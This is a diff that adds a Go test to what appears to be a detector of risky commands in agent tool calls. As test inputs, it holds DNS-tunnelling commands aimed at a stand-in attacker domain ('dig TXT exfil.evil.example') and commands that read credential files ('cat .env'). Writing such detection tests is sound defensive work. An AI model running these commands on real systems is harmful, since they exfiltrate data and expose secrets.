@@ -152,6 +152,42 @@ func TestCaseInsensitiveCommandMatching(t *testing.T) {
 	}
 }
 
+// TestBypassFixes covers literal-string bypasses closed on this branch: the
+// `dig <name> TXT` argument ordering and the bare-cwd `cat .env` form.
+func TestBypassFixes(t *testing.T) {
+	eng := newRuleEngine(t)
+	fires := func(rule string, command string) bool {
+		for _, r := range eng.Evaluate(map[string]string{"event_type": "tool_call", "command": command}) {
+			if r.Matched && r.RuleName == rule {
+				return true
+			}
+		}
+		return false
+	}
+
+	// dig TXT in either argument order.
+	for _, c := range []string{
+		"dig TXT exfil.evil.example",
+		"dig exfil.evil.example TXT",
+		"dig +short exfil.evil.example TXT",
+	} {
+		if !fires("Potential DNS Tunneling or Encoded Data Transfer", c) {
+			t.Errorf("dig TXT rule should fire on %q", c)
+		}
+	}
+
+	// .env read with and without a leading path.
+	for _, c := range []string{"cat .env", "cat /app/.env", "head .env.local"} {
+		if !fires("Credential File Access Attempt", c) {
+			t.Errorf("credential-access rule should fire on %q", c)
+		}
+	}
+	// A non-dotenv file must not trip it.
+	if fires("Credential File Access Attempt", "cat environment.md") {
+		t.Errorf("credential-access rule must not fire on benign environment.md")
+	}
+}
+
 // TestCanonicalDestinationAllowlistRegex validates the corrected
 // filter_canonical_destination pattern directly. That selection guards the
 // outbound_request branch, which no producer emits yet (Phase 2), so it cannot
